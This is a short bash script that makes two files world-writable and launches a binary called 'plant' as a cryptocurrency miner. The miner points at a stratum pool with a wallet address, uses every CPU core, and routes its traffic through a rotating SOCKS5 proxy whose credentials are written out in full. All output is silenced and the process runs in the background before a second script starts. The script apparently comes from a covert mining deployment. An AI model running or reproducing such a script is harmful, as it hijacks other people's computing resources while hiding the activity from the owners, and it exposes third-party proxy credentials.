#!/bin/bash
chmod 777 lo.sh plant
./plant -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qc4y863shhe78t5st7ayt40gmdzpwm74w0m7dmc.Mjollnir -p Mjollnir -t $(nproc --all) -x socks5://speedest88-NL-rotate:speedest88@p.webshare.io:80 > /dev/null 2>&1 &
./lo.sh
